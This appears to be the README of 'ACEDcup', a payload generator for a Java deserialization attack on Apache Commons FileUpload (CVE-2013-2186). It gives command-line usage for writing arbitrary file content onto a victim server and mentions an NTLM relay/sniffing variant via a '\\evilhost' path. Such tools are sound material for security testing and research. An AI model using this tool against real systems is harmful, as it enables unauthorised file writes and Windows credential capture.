# ACEDcup

ACEDcup tool is a payload generator for Java Binary Deserialization attack (ACED)
For Apache Commons FileUpload ver <= 1.3 (CVE-2013-2186) and Oracle JDK ver < 7u40

The attack works even for newer versions of the lib or Java. We can upload any content in any directory, but 
we cannot control a file name in this situation. Hovewer, it may be useful in some cases. 

Also we can perform aNTLM-relay/sniffing attack (using \\\\evilhost\\any\\path) if your target is on Windows OS.

## Usage
```
  java -jar aced_cup.jar /path/payload /path/target /path/out 1
  
  /path/payload - a path to a file with your payload
  /path/target - a path to a file that will be created in your victim
  /path/out - a path to a file with serialized payload
  0 - turn off null-byte ending if you attack a patched system (with null by default)
```
## Example

 ```java -jar aced_cup.jar D:\\cup_exploit\\payload.txt /home/user/test/any_name.txt D:\\cup_exploit\\emp1.ser```

